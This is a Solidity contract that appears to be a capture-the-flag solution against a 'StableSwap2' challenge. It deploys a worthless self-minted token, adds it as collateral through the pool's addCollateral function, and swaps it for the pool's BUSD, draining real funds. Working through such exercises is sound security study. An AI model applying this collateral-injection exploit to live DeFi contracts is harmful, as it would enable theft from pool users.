// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.0;

import "./Setup.sol";
import "./StableSwap2.sol";

import {ERC20PresetFixedSupply} from "@openzeppelin/contracts/token/ERC20/presets/ERC20PresetFixedSupply.sol";

contract Solve {
    constructor(Setup s, StableSwap2 ins) public {
        s.BUSD().balanceOf(address(ins));
        s.faucet(1000);
        s.USDC().approve(address(ins), 1000);
        uint256[] memory amounts = new uint256[](3);
        amounts[0] = 1000;
        ins.mint(amounts);
        ins.donate(1000);
        ins.owner();
        ERC20PresetFixedSupply COOL = new ERC20PresetFixedSupply(
            "COOL",
            "COOL",
            10000,
            address(this)
        );
        COOL.approve(address(ins), 10000);
        ins.addCollateral(address(COOL));
        ins.swap(address(COOL), 10000, address(s.BUSD()));
    }
}
